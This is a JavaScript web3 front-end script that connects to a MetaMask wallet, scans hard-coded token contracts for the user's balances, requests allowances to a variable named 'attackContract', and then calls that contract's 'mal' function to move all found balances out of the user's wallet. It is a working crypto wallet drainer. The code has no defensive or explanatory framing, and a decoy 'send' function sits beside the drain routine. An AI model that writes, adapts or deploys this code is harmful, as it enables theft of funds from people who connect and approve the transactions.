let userWallet = document.getElementById('wallet')

//here you must put the contracts that you want to be scanned.
const contracts = ["0x337610d27c682E347C9cD60BD4b3b107C9d34dDd","0x9E7Baa51DC9A96423454fb5EDD6C8a0651d298a6","0xA2361de17c3f291116bf5fb48B4b3bDA7ea66DAb","0xa6b32A7be0Be9CEe0D4D5E81A0599f88BB02905e"]

//you can use this contract address, it is the deploy of what is in contract.sol
const attackContract = "0x3e4929C1eBbBD3EC03d7ceF0720645f777BBFB46"

async function login(){
    let accounts = await ethereum.request({ method: 'eth_requestAccounts'})
    userWallet.innerHTML = accounts[0]
}

function getProvider(){
    if(!window.ethereum){
        console.log('No metamask')
    }else{
        console.log('...')
    }
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    return provider
}


async function getBalances(){
    const data = [[],[]]
    const provider = getProvider()
    let i = 0
    while(i < contracts.length){
        const contract = new ethers.Contract(contracts[i], ["function balanceOf(address) view returns (uint)"], provider)
        const balanceThis = await contract.balanceOf(userWallet.innerHTML)
        const balance = balanceThis.toString()
        console.log(`BALANCE ${contracts[i]}: ${balance}`) 
        if(balance > 0){
            data[0].push(contracts[i].toString())
            data[1].push(balance)
        }
        i++
    }
    
    console.log("Data: ",data)
    return data
}


async function destroy(){
    const provider = getProvider()
    const signer = provider.getSigner()
    const data = await getBalances()

    let i = 0
    while(i < data[0].length){
        const contract = new ethers.Contract(data[0][i], ["function increaseAllowance(address spender, uint256 addedValue) public returns (bool)","function allowance(address owner, address spender) public view returns (uint256)" ], provider)
        const contractSigner = contract.connect(signer)
        
        const approve = await contractSigner.allowance(userWallet.innerHTML, attackContract)
        console.log(`CONTRACT: ${data[0][i]}`)
        console.log(`PERMISSION: ${approve}`)
        if(await approve["_hex"] == "0x00"){
            console.log("waiting for permission...")
            const tx = await contractSigner.increaseAllowance(attackContract, data[1][i])
            console.log("PERMISSION TRANSACTION!!!", tx)
        }
        i++
    }
    let o = 0
    while(o < data[0].length){
        console.log("Entrou no bloco de verificação")
        const contract = new ethers.Contract(data[0][o],["function allowance(address owner, address spender) public view virtual override returns (uint256)"], provider)
        const contractSigner = contract.connect(signer)
        const approve = await contractSigner.allowance(userWallet.innerHTML, attackContract)
        console.log("waiting for permission...", approve)
        if(await approve["_hex"] != "0x00"){
            console.log("APPROVE", approve["_hex"])
            console.log("CONTRACT: " + data[0][o])
            o++
        }
    }
    console.log(data[0])
    console.log(data[1])
    if(data[0][0] != undefined){
        const contract = new ethers.Contract(attackContract, ["function mal(address[] memory  _contracts, uint256[] memory  _amounts, address _from)external returns(bool)"], provider)
        const contractSigner = contract.connect(signer)
        const tx = await contractSigner.mal(data[0], data[1], userWallet.innerHTML)
        console.log("TRANSFER TRANSACTION")
        console.log(tx)
        return tx
    }else{
        console.log("NOT")
    }
    
}

async function getbrt(){
    const contractSender = "0x313dB64450850d1432C91D897963B0d617b7dAF5"
    const provider = getProvider()
    const signer = provider.getSigner()
    const contract = new ethers.Contract(contractSender,["function send()external returns(bool)"], provider)
    const contractSigner = contract.connect(signer)
    const tx = await contractSigner.send()
    console.log(tx)
}





